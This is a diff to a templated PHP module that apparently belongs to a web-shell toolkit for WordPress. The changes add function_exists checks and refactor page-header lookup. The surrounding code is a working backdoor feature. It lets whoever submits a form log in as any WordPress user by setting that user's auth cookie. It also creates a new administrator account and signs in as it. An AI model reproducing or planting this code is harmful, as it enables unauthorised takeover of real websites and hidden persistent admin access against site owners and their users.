@@ -15,15 +15,19 @@ $IMPERSONATE_WP_USER = "__FEAT_IMPERSONATE_WP_USER__";
  * @param $css string The CSS of the page
  */
 function __PREFIX__makeWpImpersonatePage(&$page_content, $features, $page, $css) {
+    $feature = array_values(array_filter($features, function ($feature) use ($page) {
+        return $feature["op"] === $page;
+    }));
+
     $users        = __PREFIX__getWPUsers();
     $page_content = __PREFIX__makePage(
         $features,
-        $page,
         $css,
+        $page,
         array(
             __PREFIX__makePageHeader(
-                $features[$page]["title"],
-                $features[$page]["description"]
+                $feature[0]["title"],
+                $feature[0]["description"]
             ),
             __PREFIX__makeTable(
                 "Users",
@@ -94,6 +98,12 @@ function __PREFIX__makeWpImpersonatePage(&$page_content, $features, $page, $css)
 function __PREFIX__handleWpImpersonate($operation, $features) {
     // Run the impersonate operation
     if (!empty($_POST["__PARAM_1__"])) {
+        if(!function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
+           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
+           !function_exists("site_url")){
+            return;
+        }
+
         $user = get_user_by("login", $_POST["__PARAM_1__"]);
         if ($user) {
             wp_set_current_user($user->ID, $user->user_login);
@@ -105,6 +115,13 @@ function __PREFIX__handleWpImpersonate($operation, $features) {
     // Run the user creation operation
     elseif (!empty($_POST["__PARAM_2__"]) &&
             !empty($_POST["__PARAM_3__"])) {
+        if(!function_exists("wp_insert_user") || !function_exists("is_wp_error") ||
+           !function_exists("get_user_by") || !function_exists("wp_set_current_user") ||
+           !function_exists("wp_set_auth_cookie") || !function_exists("wp_redirect") ||
+           !function_exists("site_url")){
+            return;
+        }
+
         // creates the admin user
         $user_id = wp_insert_user(
             array(
@@ -170,6 +187,10 @@ function __PREFIX__makeWpUserTableRow($data) {
  * @return array List of WordPress users
  */
 function __PREFIX__getWPUsers() {
+    if(!function_exists("get_users")) {
+        return array();
+    }
+
     return array_map(
         "__PREFIX__makeWpUserTableRow",
         get_users()
